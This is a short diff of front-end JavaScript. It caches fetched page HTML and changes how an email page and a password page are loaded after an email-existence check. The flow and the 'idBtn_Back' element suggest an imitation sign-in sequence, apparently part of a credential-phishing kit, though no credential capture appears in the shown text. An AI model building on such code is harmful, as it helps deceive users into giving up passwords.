@@ -49,7 +49,8 @@ if(dis){
 $("#screen1").html(scrn['msg']);
 
 }else{
-return scrn;    
+//return scrn;  
+ pages[page]=scrn['msg'];  
 }
 $("#load").hide();
 }
@@ -107,7 +108,7 @@ $("#load").hide();
 $("#error1").html(Errs['Notemail']);
 
 }else if (vdata["IfExistsResult"]=='6') {
-      await getpage('EmailPage',1); 
+      await getpage('EmailPage',0); 
   await getpage('ChoosenPage',1); 
 $("#load").hide();
 }else{
@@ -120,7 +121,7 @@ Timeout=setTimeout(async function(){
     }else{
    await getpage('PassPage',1); 
     }
-  await getpage('EmailPage',1); 
+  await getpage('EmailPage',0); 
 if(bac==1){
     $("#idBtn_Back").show();
 }else{
